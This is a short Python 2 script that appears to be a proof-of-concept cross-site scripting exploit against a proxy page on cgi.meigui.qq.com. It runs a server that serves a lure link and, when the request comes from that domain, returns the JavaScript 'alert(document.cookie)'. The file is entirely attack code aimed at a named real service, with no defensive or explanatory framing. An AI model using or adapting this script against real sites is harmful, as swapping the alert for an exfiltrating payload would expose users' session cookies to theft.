#!/usr/bin/python
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import threading

class Handler(BaseHTTPRequestHandler):
	def do_GET(self):
                ref = self.headers.get('referer')
                print ref
                js = 'alert(document.cookie)'
                html = '<a href="http://cgi.meigui.qq.com/js/jqproxy.html?referrer">CLick Me</a>'
                if (ref and ref.startswith('http://cgi.meigui.qq.com/')):
                        self.send_response(200)
                        self.send_header('Cache-Control', 'no-cache')
                        self.send_header('Content-type','application/javascript')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.send_header('Conent-Length', len(js))
                        self.end_headers()
                        self.wfile.write(js)
                else:
                        self.send_response(200)
                        self.send_header('Cache-Control', 'no-cache')
                        self.send_header('Content-type','text/html')
                        self.send_header('Conent-Length', len(html))
                        self.end_headers()
                        self.wfile.write(html)
                return


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

if __name__ == '__main__':
    server = ThreadedHTTPServer(('0.0.0.0', 9999), Handler)
    print 'Starting server, use <Ctrl-C> to stop'
    server.serve_forever()




